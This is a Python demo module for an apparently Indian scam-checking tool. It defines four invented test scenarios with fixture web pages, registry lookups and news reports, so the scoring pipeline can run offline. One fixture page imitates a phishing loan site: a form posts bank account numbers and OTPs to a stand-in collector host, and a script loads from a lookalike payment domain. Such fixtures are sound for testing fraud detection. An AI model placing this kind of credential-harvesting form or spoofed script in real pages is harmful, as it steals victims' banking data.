"""Demo mode: four MADE-UP cases that run the full pipeline with no API key.

Every name, URL, number and report below is invented for demonstration.
The pages and search answers are fixtures, but they go through the same
claim extraction, source cross-checks and ProofGrid rules as a live check,
so the scores are computed, not hard-coded.

    QuickRupee           fake loan app          -> 18 / 100
    Bullvanta Signals    Telegram stock tips    ->  0 / 100
    Hirevexa Internships fake internship offer  -> 65 / 100
    SafeKosh Finance     clean loan app         -> 100 / 100
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from datetime import date, timedelta

from .gemini import GeminiResult
from .web import Page, html_to_text, page_title


def _ago(days: int) -> str:
    return (date.today() - timedelta(days=days)).isoformat()


def _src(*hosts: str) -> list[dict]:
    return [{"title": h, "url": f"https://vertexaisearch.cloud.google.com/grounding-api-redirect/demo-{i}"}
            for i, h in enumerate(hosts)]


def _g(data: dict, queries: list[str], hosts: list[str]) -> GeminiResult:
    text = "```json\n" + json.dumps(data, indent=2) + "\n```"
    return GeminiResult(text=text, data=data, queries=queries, sources=_src(*hosts))


@dataclass
class Scenario:
    key: str
    aliases: list[str]
    subject: dict
    pages: dict[str, str]  # url fragment -> html
    answers: dict[str, GeminiResult]
    domains: dict[str, int] = field(default_factory=dict)  # domain -> age in days

    def page(self, url: str) -> Page:
        for frag, html in self.pages.items():
            if frag in url:
                return Page(url=url, final_url=url, status=200, title=page_title(html), html=html,
                            text=html_to_text(html))
        return Page(url=url, final_url=url, status=404, title="", html="", text="", error="not in demo")

    def gemini(self, key: str) -> GeminiResult:
        return self.answers.get(key) or GeminiResult(text="{}", data={}, queries=[], sources=[])

    def rdap(self, domain: str) -> dict:
        url = f"https://rdap.org/domain/{domain}"
        if domain not in self.domains:
            return {"ok": False, "domain": domain, "source_url": url, "error": "not found"}
        age = self.domains[domain]
        return {"ok": True, "domain": domain, "source_url": url, "registered_on": _ago(age), "age_days": age,
                "raw": {"objectClassName": "domain", "ldhName": domain,
                        "events": [{"eventAction": "registration", "eventDate": _ago(age) + "T00:00:00Z"}],
                        "remarks": [{"description": ["DEMO DATA - simulated RDAP record"]}]}}


def _subject(query: str, name: str, category: str, **kw) -> dict:
    from .resolver import slugify

    base = {"query": query, "slug": slugify(name), "display_name": name, "category": category,
            "website_url": None, "play_url": None, "telegram_url": None, "legal_name": None}
    base.update(kw)
    return base


def build(query: str) -> Scenario | None:
    q = " ".join(query.lower().split())
    for make in (_quickrupee, _bullvanta, _hirevexa, _safekosh):
        sc = make(query)
        if any(a in q for a in sc.aliases):
            return sc
    return None


DEMO_NAMES = ["QuickRupee - Instant Loan App", "Bullvanta Signals", "Hirevexa Internships", "SafeKosh Finance"]


# ---------------------------------------------------------------------------
def _quickrupee(query: str) -> Scenario:
    pid = "com.quickrupee.instantloan"
    return Scenario(
        key="quickrupee", aliases=["quickrupee", "quick rupee"],
        subject=_subject(query, "QuickRupee", "lending", website_url="https://quickrupee-loans.in",
                         play_url=f"https://play.google.com/store/apps/details?id={pid}"),
        pages={
            "quickrupee-loans.in": """<html><head><title>QuickRupee - Instant Loan in 2 Minutes</title></head><body>
<h1>Get Rs. 50,000 in 2 minutes!</h1><p>No documents needed. No CIBIL check.</p>
<p>Trusted by 25 lakh Indians for 10 years.</p>
<p>Lending partner: Zorvana Finvest Private Limited</p>
<p>Pay via UPI 9876543210@paytm to activate your loan.</p>
<a href="https://downloads.example/quickrupee.apk">Download Android installer</a>
<form method="post" action="http://collector.example/verify"><input name="account_number"><input name="otp"></form>
<script src="https://checkout.razorpay.com.evil.example/checkout.js"></script>
<footer><p>&copy; 2026 Quickrupee Fintech Private Limited. All rights reserved.</p></footer></body></html>""",
            f"details?id={pid}": f"""<html><head><meta property="og:title" content="QuickRupee - Instant Loan App"></head><body>
<h1><span>QuickRupee - Instant Loan App</span></h1>
<a href="/store/apps/dev?id=8812345670001"><span>Qrovix Tech Solutions</span></a>
<div>Instant personal loan up to Rs. 50,000. 10 years trusted. Approval in 2 minutes.</div>
<div>100K+ downloads</div></body></html>""",
            f"datasafety?id={pid}": """<html><body><h2>Data safety</h2>
<p>This app may collect these data types</p>
<ul><li>Personal info</li><li>Financial info</li><li>Contacts</li><li>Photos and videos</li><li>App activity</li></ul>
</body></html>""",
        },
        answers={
            "rbi": _g({"found": False, "app_name": None, "entity": None, "reg_no": None, "status": None,
                       "evidence_url": None,
                       "notes": "No 'QuickRupee' entry in RBI's DLA directory; 'Zorvana Finvest' not found among RBI-registered NBFCs."},
                      ["QuickRupee loan app RBI DLA list", "Zorvana Finvest NBFC RBI registration"],
                      ["rbi.org.in"]),
            "company": _g({"found": True, "cin": "U65999HR2026PTC000101", "company_name": "Quickrupee Fintech Private Limited",
                           "incorporated_on": _ago(95), "status": "Active",
                           "evidence_url": "https://www.zaubacorp.com/company/QUICKRUPEE-FINTECH-PRIVATE-LIMITED/U65999HR2026PTC000101",
                           "notes": "Incorporated about 3 months ago."},
                          ["Quickrupee Fintech Private Limited CIN incorporation date"], ["zaubacorp.com"]),
            "news": _g({"reports": [
                {"title": "Borrowers say QuickRupee recovery agents sent threats to contacts", "url": "https://khabarnow.example/quickrupee-threats",
                 "source": "KhabarNow (demo)", "type": "harassment", "date": _ago(20)},
                {"title": "QuickRupee app used morphed photos to demand money, user alleges", "url": "https://forum.example/t/quickrupee-extortion",
                 "source": "Forum (demo)", "type": "extortion", "date": _ago(14)},
                {"title": "Complaint: QuickRupee called my family 40 times", "url": "https://complaintboard.example/quickrupee-1",
                 "source": "ComplaintBoard (demo)", "type": "harassment", "date": _ago(9)},
                {"title": "Cyber cell warns about QuickRupee-type instant loan apps", "url": "https://khabarnow.example/cyber-cell-loan-apps",
                 "source": "KhabarNow (demo)", "type": "fraud", "date": _ago(5)},
                {"title": "QuickRupee review blog", "url": "https://random-blog.example/quickrupee",
                 "source": "Blog (demo)", "type": "other", "date": None},
            ], "notes": "Demo data."},
                ["QuickRupee loan app harassment", "QuickRupee scam complaints"],
                ["khabarnow.example", "forum.example", "complaintboard.example"]),
        },
        domains={"quickrupee-loans.in": 120},
    )


def _bullvanta(query: str) -> Scenario:
    return Scenario(
        key="bullvanta", aliases=["bullvanta"],
        subject=_subject(query, "Bullvanta Signals", "investment", website_url="https://bullvantasignals.com",
                         telegram_url="https://t.me/bullvantasignals"),
        pages={
            "bullvantasignals.com": """<html><head><title>Bullvanta Signals | India's No.1 Stock Tips</title></head><body>
<h1>Bullvanta Signals</h1><p>10 years trusted company in the stock market.</p>
<p>SEBI Regd. Research Analyst. CIN U67190MH2014PTC000777</p>
<p>Join our VIP Telegram for sure-shot intraday calls.</p></body></html>""",
            "t.me/s/bullvantasignals": """<html><head><meta property="og:title" content="Bullvanta Signals"></head><body>
<div class="tgme_channel_info_header_title">Bullvanta Signals</div>
<div class="tgme_widget_message_text">SEBI Registered Research Analyst INH000000000. Guaranteed 300% returns in 30 days!</div>
<div class="tgme_widget_message_text">VIP group fee Rs. 4,999 only. Limited seats. DM admin now.</div>
</body></html>""",
        },
        answers={
            "sebi": _g({"found": False, "name": None, "reg_no": None, "category": None, "valid_till": None,
                        "evidence_url": None,
                        "notes": "No Investment Adviser or Research Analyst named 'Bullvanta'; INH000000000 is not a SEBI record."},
                       ["Bullvanta Signals SEBI registered research analyst", "INH000000000 SEBI research analyst"],
                       ["sebi.gov.in"]),
            "company": _g({"found": True, "cin": "U67190MH2014PTC000777", "company_name": "Velqora Agro Traders Private Limited",
                           "incorporated_on": "2014-06-11", "status": "Strike Off",
                           "evidence_url": "https://www.zaubacorp.com/company/VELQORA-AGRO-TRADERS-PRIVATE-LIMITED/U67190MH2014PTC000777",
                           "notes": "This CIN belongs to an agro trading company that was struck off."},
                          ["U67190MH2014PTC000777"], ["zaubacorp.com", "tofler.in"]),
            "news": _g({"reports": [
                {"title": "Telegram 'Bullvanta' group took Rs 4,999 fee, then blocked members", "url": "https://forum.example/t/bullvanta-vip-scam",
                 "source": "Forum (demo)", "type": "scam", "date": _ago(4)},
                {"title": "Investors lose money to fake SEBI analyst channel 'Bullvanta Signals'", "url": "https://khabarnow.example/bullvanta",
                 "source": "KhabarNow (demo)", "type": "fraud", "date": _ago(2)},
            ], "notes": "Demo data."},
                ["Bullvanta Signals scam", "Bullvanta telegram fraud"], ["forum.example", "khabarnow.example"]),
        },
        domains={"bullvantasignals.com": 12},
    )


def _hirevexa(query: str) -> Scenario:
    return Scenario(
        key="hirevexa", aliases=["hirevexa"],
        subject=_subject(query, "Hirevexa Internships", "job", website_url="https://hirevexa-careers.in"),
        pages={
            "hirevexa-careers.in": """<html><head><title>Hirevexa Internships - Work From Home</title></head><body>
<h1>Congratulations! You are selected.</h1>
<p>Work from home internship with stipend Rs. 15,000/month.</p>
<p>Pay a refundable registration fee of Rs. 1,999 to confirm your seat today.</p>
<p>Serving students for 5 years.</p>
<footer>Hirevexa Talent Private Limited | CIN U74999DL2019PTC000555</footer></body></html>""",
        },
        answers={
            "company": _g({"found": True, "cin": "U74999DL2019PTC000555", "company_name": "Hirevexa Talent Private Limited",
                           "incorporated_on": "2019-08-14", "status": "Active",
                           "evidence_url": "https://www.zaubacorp.com/company/HIREVEXA-TALENT-PRIVATE-LIMITED/U74999DL2019PTC000555",
                           "notes": "Registered company, active."},
                          ["U74999DL2019PTC000555"], ["zaubacorp.com"]),
            "news": _g({"reports": [
                {"title": "Students say Hirevexa internship fee was never refunded", "url": "https://forum.example/t/hirevexa-fee",
                 "source": "Forum (demo)", "type": "fake_offer", "date": _ago(30)},
                {"title": "Hirevexa asked for Rs 1,999 for 'internship kit'", "url": "https://complaintboard.example/hirevexa",
                 "source": "ComplaintBoard (demo)", "type": "scam", "date": _ago(11)},
            ], "notes": "Demo data."},
                ["Hirevexa internship fee scam"], ["forum.example", "complaintboard.example"]),
        },
        domains={"hirevexa-careers.in": 45},
    )


def _safekosh(query: str) -> Scenario:
    pid = "com.safekosh.app"
    return Scenario(
        key="safekosh", aliases=["safekosh", "safe kosh"],
        subject=_subject(query, "SafeKosh Finance", "lending", website_url="https://safekosh.in",
                         play_url=f"https://play.google.com/store/apps/details?id={pid}"),
        pages={
            "safekosh.in": """<html><head><title>SafeKosh Finance - Personal Loans</title></head><body>
<h1>SafeKosh Finance</h1>
<p>Personal loans by SafeKosh Capital Limited, an RBI registered NBFC (Reg. No. N-14.03999).</p>
<p>Serving customers since 2016. Interest from 14% p.a. All charges shown before you sign.</p></body></html>""",
            f"details?id={pid}": """<html><body><h1><span>SafeKosh: Personal Loan</span></h1>
<a href="/store/apps/developer?id=SafeKosh+Capital+Limited"><span>SafeKosh Capital Limited</span></a>
<div>Loans from an RBI registered NBFC.</div></body></html>""",
            f"datasafety?id={pid}": """<html><body><h2>Data safety</h2>
<ul><li>Personal info</li><li>Financial info</li><li>Location</li><li>App activity</li></ul></body></html>""",
        },
        answers={
            "rbi": _g({"found": True, "app_name": "SafeKosh", "entity": "SafeKosh Capital Limited", "reg_no": "N-14.03999",
                       "status": "Listed", "evidence_url": "https://www.rbi.org.in/", "notes": "Listed in DLA directory (demo)."},
                      ["SafeKosh app RBI DLA directory"], ["rbi.org.in"]),
            "company": _g({"found": True, "cin": "U65990KA2016PLC000333", "company_name": "SafeKosh Capital Limited",
                           "incorporated_on": "2016-03-02", "status": "Active",
                           "evidence_url": "https://www.zaubacorp.com/company/SAFEKOSH-CAPITAL-LIMITED/U65990KA2016PLC000333",
                           "notes": "Active since 2016."},
                          ["SafeKosh Capital Limited CIN"], ["zaubacorp.com"]),
            "news": _g({"reports": [], "notes": "No scam or harassment reports found (demo)."},
                       ["SafeKosh Finance scam complaints"], ["khabarnow.example"]),
        },
        domains={"safekosh.in": 3400},
    )
